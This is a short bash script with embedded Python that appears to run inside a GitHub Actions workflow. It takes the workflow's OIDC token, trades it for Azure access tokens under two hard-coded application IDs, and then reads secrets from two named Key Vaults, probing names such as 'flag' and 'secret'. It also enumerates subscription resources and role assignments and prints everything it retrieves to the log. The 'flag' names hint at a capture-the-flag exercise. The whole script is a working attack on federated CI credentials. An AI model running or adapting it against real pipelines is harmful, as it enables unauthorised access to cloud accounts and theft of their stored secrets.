#!/usr/bin/env bash
set -u
python3 - <<'PY'
import os,json,urllib.request,urllib.parse,urllib.error,base64
T=os.environ.get('AZURE_TENANT_ID','3205c325-06a5-4171-9ce8-ffc5e6c2845e'); SUB=os.environ.get('AZURE_SUBSCRIPTION_ID','c5e4e004-b42d-4ac4-a502-5fd338380eb6'); OID=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']; OH={'Authorization':'Bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']}
def req(u,method='GET',data=None,h=None):
 try:
  r=urllib.request.urlopen(urllib.request.Request(u,data=data,headers=h or {},method=method),timeout=20);return r.status,r.read()
 except urllib.error.HTTPError as e:return e.code,e.read()
 except Exception as e:return 0,str(e).encode()
def J(x):
 try:return json.loads(x)
 except:return {}
def tok(cid,scope):
 s,b=req(OID+'&audience=api://AzureADTokenExchange',h=OH); oidc=J(b).get('value',''); print('OIDC',len(oidc))
 d={'client_id':cid,'grant_type':'client_credentials','scope':scope,'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':oidc}
 s,b=req(f'https://login.microsoftonline.com/{T}/oauth2/v2.0/token','POST',urllib.parse.urlencode(d).encode(),{'Content-Type':'application/x-www-form-urlencoded'}); print('EXCHANGE',cid,scope,s,len(b),b[:400]); return J(b).get('access_token','')
for cid in ['891fb158-e02c-4428-a885-53b811f369c0','72ff278a-9e71-43ec-bac4-2ca303f8e462']:
 for scope in ['https://management.azure.com/.default','https://vault.azure.net/.default']:
  t=tok(cid,scope)
  if not t: continue
  p={'Authorization':'Bearer '+t}
  if 'vault' in scope:
   for v in ['kv-tbl-sec-x3euoz','kv-tbl-prod-x3euoz']:
    for n in ['','flag','DF26','secret']:
     u=f'https://{v}.vault.azure.net/secrets'+('/'+n if n else '')+'?api-version=7.4'; s,b=req(u,h=p); print('VAULT',cid,v,n or 'LIST',s,len(b),b[:2000])
  else:
   for u in [f'https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01',f'https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01']:
    s,b=req(u,h=p);print('ARM',cid,s,len(b),b[:3000])
PY
